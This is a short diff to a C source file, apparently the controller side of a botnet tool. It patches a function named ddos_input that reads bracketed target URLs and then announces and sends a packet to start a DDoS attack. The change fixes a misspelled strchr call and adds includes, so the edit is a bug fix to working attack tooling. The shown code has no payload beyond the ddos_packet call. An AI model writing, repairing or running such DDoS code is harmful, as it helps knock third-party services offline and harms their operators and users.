@@ -1,6 +1,9 @@
 #include <stdio.h>
 #include <stdint.h>
+#include <string.h>
 #include <winsock2.h>
+
+#include "../stdlib/packet.h"
 
 #include "admin.h"
 
@@ -42,10 +45,10 @@ void ddos_input(SOCKET sock) {
             urls[len - 1] = '\0';
         }
 
-        if (strchar(urls, '[') == NULL || strchar(urls, ']') == NULL) {
+        if (strchr(urls, '[') == NULL || strchr(urls, ']') == NULL) {
             printf("\033[33m[!] String format error!\033[0m\n");
         }
-    } while (urls != NULL && strchar(urls, '[') != NULL || strchar(urls, ']') != NULL);
+    } while (urls != NULL && strchr(urls, '[') != NULL || strchr(urls, ']') != NULL);
 
     printf("Sending a packet at the beginning of a DDoS attack...\n");
     if (ddos_packet(sock, NULL) < 0) {
